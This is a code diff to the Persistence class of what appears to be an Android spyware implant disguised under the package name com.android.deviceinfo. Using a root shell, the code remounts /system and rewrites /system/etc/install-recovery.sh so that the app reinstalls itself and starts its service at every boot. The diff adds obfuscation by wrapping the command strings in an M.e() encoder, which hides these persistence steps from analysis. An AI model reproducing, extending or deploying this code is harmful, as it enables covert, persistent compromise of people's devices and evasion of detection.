@@ -12,6 +12,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 // Use this class only when the suid shell is installed
 public class Persistence {
@@ -70,16 +71,16 @@ public class Persistence {
 	}
 	
 	public void addPersistance() {
-		String install = "/system/bin/pm install -f " + storageDir + "/" + getName();
-		String start = "/system/bin/am startservice -n " + curPackageName + "/.ServiceMain";
+		String install = M.e("/system/bin/pm install -f ") + storageDir + "/" + getName();
+		String start = M.e("/system/bin/am startservice -n ") + curPackageName + M.e("/.ServiceMain");
 		String scriptBody = "sleep 10\nif " + install + "; then\n" + "    " + start + "\nfi";
 		
 		// Backup install-recovery.sh
 		String scriptName = "bu";
-		String script = "#!/system/bin/sh\n";
-		script += Configuration.shellFile + " " + "srh" + " " + "\"" + install + "\" /system/etc/install-recovery.sh";
+		String script = M.e("#!/system/bin/sh") + "\n";
+		script += Configuration.shellFile + " " + "srh" + " " + "\"" + install + "\"" + M.e(" /system/etc/install-recovery.sh");
 		script += "\nif [ $? == 0 ]; then\n    ";
-		script += Configuration.shellFile + " " + "fhc" + " " + "/system/etc/install-recovery.sh" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8);
+		script += Configuration.shellFile + " " + "fhc" + " " + M.e("/system/etc/install-recovery.sh") + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8);
 		script += "\nfi";
 		
 		Root.createScript(scriptName, script);
@@ -93,8 +94,8 @@ public class Persistence {
 		
 		// Write our script into /system/etc/install-recovery.sh
 		scriptName = "ip";
-		script = "#!/system/bin/sh\n";
-		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\" /system/etc/install-recovery.sh";
+		script = M.e("#!/system/bin/sh") + "\n";
+		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh");
 		
 		Root.createScript(scriptName, script);
 		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
@@ -112,7 +113,7 @@ public class Persistence {
 		// Remount /system
 		Execute.execute(Configuration.shellFile + " " + "blw");
 		
-		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + "/system/etc/install-recovery.sh");
+		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
 		
 		// Return /system to normal
 		Execute.execute(Configuration.shellFile + " " + "blr");
